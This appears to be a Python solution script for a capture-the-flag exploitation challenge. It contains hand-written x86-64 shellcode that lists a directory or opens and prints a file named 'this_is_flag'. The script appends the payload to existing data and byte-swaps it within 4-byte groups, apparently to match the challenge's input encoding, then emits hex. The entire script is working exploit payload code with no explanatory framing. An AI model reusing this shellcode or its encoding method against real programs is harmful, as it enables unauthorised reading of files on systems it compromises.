
with open("shellcode", "rb") as f:
    data = f.read()

# with open("read_shellcode", "rb") as f:
#     shellcode = f.read()

# print(shellcode)

filename = b"this_is_flag".ljust(24, b"\x00")
shellcode_ls = b'\xebA_\x80w\x18AH1\xc0\x04\x02H1\xf6\x0f\x05f\x81\xec\xff\x0fH\x8d4$H\x89\xc7H1\xd2f\xba\xff\x0fH1\xc0\x04N\x0f\x05H1\xff@\x80\xc7\x01H\x89\xc2H1\xc0\x04\x01\x0f\x05H1\xc0\x04<\x0f\x05\xe8\xba\xff\xff\xff' + filename + b'A'
shellcode_cat = b'\xeb?_\x80w\x18AH1\xc0\x04\x02H1\xf6\x0f\x05f\x81\xec\xff\x0fH\x8d4$H\x89\xc7H1\xd2f\xba\xff\x0fH1\xc0\x0f\x05H1\xff@\x80\xc7\x01H\x89\xc2H1\xc0\x04\x01\x0f\x05H1\xc0\x04<\x0f\x05\xe8\xbc\xff\xff\xff' + filename + b'A'
data = data + shellcode_cat


new_data = []

for i in range(0, len(data), 4):
    try:
        new_data.append(data[i + 1])
    except IndexError:
        pass
    try:
        new_data.append(data[i + 0])
    except IndexError:
        pass
    try:
        new_data.append(data[i + 3])
    except IndexError:
        pass
    try:
        new_data.append(data[i + 2])
    except IndexError:
        pass

new_data = bytes(new_data)


with open("shellcode.txt", "w") as f:
    # f.write(data.hex() + "\n")
    f.write(new_data.hex())

print(len(new_data))


